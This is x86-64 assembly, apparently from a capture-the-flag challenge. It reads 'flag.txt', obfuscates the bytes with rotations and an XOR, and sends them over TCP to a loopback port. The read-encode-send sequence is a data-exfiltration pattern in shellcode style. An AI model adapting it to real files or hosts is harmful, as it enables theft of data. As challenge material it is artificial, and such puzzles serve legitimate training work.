global _start

section .text

_start:
	jmp phase1
phase1:
	sub rsp,254
	xor rsi,rsi
	xor rdi,rdi
	xor rax,rax
	mov rax,0x7478742e67616c66
	push rax
	lea rdi,[rsp]
	mov rax,2
	syscall
	cmp rax,0
	jle exit
	push rax
phase2:
	mov rdx,32
	lea rsi,[rsp+16]
	mov rdi,[rsp]
	mov rax,0x0
	syscall
	cmp rax,0
	jle closeFile
	mov rbx,rax
	xor rdx,rdx
looptext:
	cmp rdx,rbx
	jge ready
	movzx rax,byte[rsp+16+rdx]
	mov r8b,dl
	test r8b,0x1
	jnz rorRight
	rol rax,0x1
encrypt:
	xor rax, 0x33
	mov byte[rsp+16+rdx],al
	inc rdx
	jmp looptext
rorRight:
	ror rax, 0x1
	jmp encrypt
ready:
	xor rdx,rdx
	mov rsi,0x1
	mov rdi,0x2
	mov rax,0x29
	syscall
	mov byte[rsp+0x4],al
	mov byte[rsp+0x38],0x2
	mov word[rsp+0x3a],0x3905
	mov word[rsp+0x3c],0x17f
	mov rdx,0x10
	lea rsi,[rsp+0x38]
	movzx rdi,byte[rsp+0x4]
	mov rax,0x2a
	syscall
	cmp rax,0
	jne closeSocket
	mov rdx,rbx
	lea rsi,[rsp+0x10]
	mov rax,0x1
	syscall
	jmp closeSocket
closeSocket:
	movzx rdi,byte[rsp+0x4]
	mov rax,0x3
	syscall
closeFile:
	movzx rdi,byte[rsp]
	mov rax,0x3
	syscall
exit:
	xor rdi,rdi
	xor rax,rax
	mov rax,0x3c
	syscall